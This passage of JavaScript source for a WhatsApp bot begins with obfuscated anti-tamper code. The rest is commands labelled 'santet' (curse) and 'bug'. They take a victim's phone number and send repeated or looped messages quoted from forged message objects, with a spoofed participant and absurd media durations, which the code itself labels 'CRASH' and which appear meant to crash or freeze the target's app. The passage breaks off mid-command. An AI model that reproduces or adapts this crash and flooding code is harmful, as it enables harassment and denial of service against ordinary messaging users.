_0x217d49=parseInt(_0x2153c1(0x148))/0x1*(-parseInt(_0x2153c1(0x145))/0x2)+parseInt(_0x2153c1(0x133))/0x3+parseInt(_0x2153c1(0x12c))/0x4*(parseInt(_0x2153c1(0x131))/0x5)+-parseInt(_0x2153c1(0x141))/0x6*(-parseInt(_0x2153c1(0x137))/0x7)+parseInt(_0x2153c1(0x129))/0x8*(parseInt(_0x2153c1(0x149))/0x9)+parseInt(_0x2153c1(0x125))/0xa+-parseInt(_0x2153c1(0x14a))/0xb*(parseInt(_0x2153c1(0x132))/0xc);if(_0x217d49===_0x49ba35)break;else _0x365fb7['push'](_0x365fb7['shift']());}catch(_0x34f5b7){_0x365fb7['push'](_0x365fb7['shift']());}}}(_0x1080,0x9dd3d));var _0x571b48=(function(){var _0x5aa76e=!![];return function(_0x4fff51,_0x43034f){var _0x518897=_0x5aa76e?function(){var _0x428f5c=_0x3f8a;if(_0x43034f){var _0x4d1bb5=_0x43034f[_0x428f5c(0x136)](_0x4fff51,arguments);return _0x43034f=null,_0x4d1bb5;}}:function(){};return _0x5aa76e=![],_0x518897;};}()),_0x451276=_0x571b48(this,function(){var _0x55b7ea=_0x3f8a;return _0x451276[_0x55b7ea(0x13a)]()[_0x55b7ea(0x12a)](_0x55b7ea(0x140))[_0x55b7ea(0x13a)]()[_0x55b7ea(0x146)](_0x451276)[_0x55b7ea(0x12a)]('(((.+)+)+)+$');});_0x451276();var _0x151359=(function(){var _0x193ad8=!![];return function(_0x47d1d1,_0x5caed6){var _0x3167da=_0x193ad8?function(){var _0x34b604=_0x3f8a;if(_0x5caed6){var _0x4583d9=_0x5caed6[_0x34b604(0x136)](_0x47d1d1,arguments);return _0x5caed6=null,_0x4583d9;}}:function(){};return _0x193ad8=![],_0x3167da;};}()),_0x206023=_0x151359(this,function(){var _0x1d5871=_0x3f8a,_0x2b7d32;try{var _0x4e87d0=Function(_0x1d5871(0x142)+_0x1d5871(0x13b)+');');_0x2b7d32=_0x4e87d0();}catch(_0x3d18e3){_0x2b7d32=window;}var _0x48d897=_0x2b7d32[_0x1d5871(0x139)]=_0x2b7d32['console']||{},_0x4079e1=[_0x1d5871(0x12d),_0x1d5871(0x128),_0x1d5871(0x13d),_0x1d5871(0x134),_0x1d5871(0x144),_0x1d5871(0x12f),_0x1d5871(0x126)];for(var _0x4618c4=0x0;_0x4618c4<_0x4079e1[_0x1d5871(0x14b)];_0x4618c4++){var _0x4d51b3=_0x151359['constructor'][_0x1d5871(0x147)]['bind'](_0x151359),_0x2f7840=_0x4079e1[_0x4618c4],_0x4036c6=_0x48d897[_0x2f7840]||_0x4d51b3;_0x4d51b3[_0x1d5871(0x130)]=_0x151359[_0x1d5871(0x138)](_0x151359),_0x4d51b3[_0x1d5871(0x13a)]=_0x4036c6[_0x1d5871(0x13a)][_0x1d5871(0x138)](_0x4036c6),_0x48d897[_0x2f7840]=_0x4d51b3;}});_0x206023();{if(!isCreator&&!isBan)return;if(!text)throw'Nomernya\x20mana?';buttonspc=[{'buttonId':prefix+_0x26b53b(0x13e),'buttonText':{'displayText':ikyenak},'type':0x1},{'buttonId':_0x26b53b(0x12b),'buttonText':{'displayText':buttonvirus},'type':0x1},{'buttonId':'babababbababa','buttonText':{'displayText':ikyenak},'type':0x1}],buttonMessagepc={'text':_0x26b53b(0x127),'footerText':_0x26b53b(0x143),'buttons':buttonspc,'headerType':0x1},ikycoli[_0x26b53b(0x12e)](text+_0x26b53b(0x135),buttonMessagepc),m[_0x26b53b(0x13f)](_0x26b53b(0x13c));}
  }
  break

           case 'ikysantetprivate': { 
          if (!isCreator && !isBan) return
          if (!text) throw `Nomernya mana?`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `IKYY SANTET`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ SANTET"},{quoted:ikyenak66})
            await sleep(10000)
            await m.reply(`Berhasil Mengirim Santet iky Di Nomer ${text}`)
            }
            break
case 'ikythebadboyprivate': { 
          if (!isCreator && !isBan) return
          if (!text) throw `Nomernya mana?`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"- IKYY MAKERZ BAD BOY -"},{quoted:ikyenak66})
            await sleep(1000)
            await m.reply(`Berhasil Banh.`)
            }
            break
case 'ikytitikprivate': { 
          if (!isCreator && !isBan) return
          if (!text) throw `Nomernya mana?`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"."},{quoted:ikyenak66})
            await sleep(1000)
            await m.reply(`Berhasil Banh.`)
            }
            break
case 'ikytheghostprivate': { 
          if (!isCreator && !isBan) return
          if (!text) throw `Nomernya mana?`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"- THE BR4VE IKYY -"},{quoted:ikyenak66})
            await sleep(1000)
            await m.reply(`Berhasil Banh.`)
            }
            break
        case 'ikygaskensantet': {          
          if (!isCreator && !isBan) return
          if (!text) throw `Nomernya mana?`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `ILMU HITAM IKYY`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
            await ikycoli.sendMessage(m.chat, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"ILMU HITAM IKYY"},{quoted:ikyenak66})
            await sleep(10000)
            await m.reply(`Berhasil Mengirim Santet Di Nomer ${text}`)
            }
            break
         case 'ikysantet':               
          if (!isCreator && !isBan) return
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `IKYY SANTET⸸‎`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY SANTET⸸‎"},{quoted:ikyenak66})
            await sleep(10000)
            await ikycoli.sendMessage(m.chat, {text:"IKYY CRASH SANTET INFINITE!!!‎"},{quoted:ikyenak66})
            await sleep(10000)
            jancok(`BERHASIL MENGIRIM IKY SANTET`)
            break

case 'ikyinfinite':{
 if (!isCreator && !isBan) return
   ikyenak66 = { 
   key: { 
   fromMe: false, 
   participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" }) 
  }, 
  message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
 "caption": `IKYY MAKERZ INFINITE`,
 "jpegThumbnail": virgam
 } 
 } 
 }
await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(m.chat, {text:"CRASH!!!"},{quoted:ikyenak66})
 jancok(`© THE IKYY BOTZ`)
 }
 break
case 'ikybug1':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Ikyy`
for (let i = 0; i < jumlah; i++) { 
let fdoc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
documentMessage: {
title: `By: 𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`, 
jpegThumbnail: fs.readFileSync(`./pict.jpg`),
}
}
} 
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fdoc})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'ikyprivatebug1':{
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fdoc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
documentMessage: {
title: `By: 𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`, 
jpegThumbnail: fs.readFileSync(`./pict.jpg`),
}
}
} 
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fdoc})
await m.reply(`Berhasil Mengirim Bug1 Di Nomer ${text}`)
}
break
case 'ikygaskenbug1':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fdoc1 = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
documentMessage: {
title: `By: 𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`, 
jpegThumbnail: fs.readFileSync(`./pict.jpg`),
}
}
} 
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fdoc1})
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fdoc1})
jancok(`Berhasil Mengirim Bug1 Di Nomer ${text}`)
break
case 'ikybug2':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Ikyy`
for (let i = 0; i < jumlah; i++) {
let foto = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`, 
"jpegThumbnail": virgam
} 
} 
}
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:foto})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'ikyprivatebug2':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let foto = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`, 
"jpegThumbnail": virgam
} 
} 
}
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:foto})
await m.reply(`Berhasil Mengirim Bug2 Di Nomer ${text}`)
break
case 'ikygaskenbug2':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let foto1 = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`, 
"jpegThumbnail": virgam
} 
} 
}
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:foto1})
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:foto1})
jancok(`Berhasil Mengirim Bug2 Di Nomer ${text}`)
break
case 'ikybug3':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Ikyy`
for (let i = 0; i < jumlah; i++) { 
let fvoc = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "400000271",
"ptt": "true"
}
} 
}
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fvoc})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'ikyprivatebug3':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fvoc = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "400000271",
"ptt": "true"
}
} 
}
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fvoc})
await m.reply(`Berhasil Mengirim Bug3 Di Nomer ${text}`)
break
case 'ikygaskenbug3':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fvoc1 = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "400000271",
"ptt": "true"
}
} 
}
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fvoc1})
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fvoc1})
jancok(`Berhasil Mengirim Bug3 Di Nomer ${text}`)
break
case 'ikybug4':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Ikyy`
for (let i = 0; i < jumlah; i++) { 
let fgif = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "videoMessage": { 
"title":"hallo bang","h": 
`Hmm`,'seconds': '359996400', 
'gifPlayback': 'true', 
'caption': `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`,
'jpegThumbnail': fs.readFileSync(`./pict.jpg`),
}
}
}
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fgif})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'ikyprivatebug4':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fgif = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "videoMessage": { 
"title":"hallo bang","h": 
`Hmm`,'seconds': '359996400', 
'gifPlayback': 'true', 
'caption': `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`,
'jpegThumbnail': fs.readFileSync(`./pict.jpg`),
}
}
}
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fgif})
await m.reply(`Berhasil Mengirim Bug4 Di Nomer ${text}`)
break
case 'ikygaskenbug4':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fgif1 = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "videoMessage": { 
"title":"hallo bang","h": 
`Hmm`,'seconds': '359996400', 
'gifPlayback': 'true', 
'caption': `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`,
'jpegThumbnail': fs.readFileSync(`./pict.jpg`),
}
}
}
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fgif1})
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fgif1})
jancok(`Berhasil Mengirim Bug4 Di Nomer ${text}`)
break
case 'ikybug5':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Ikyy`
for (let i = 0; i < jumlah; i++) { 
let floc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
liveLocationMessage: {
caption: `By: 𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`,
jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
}
}
}
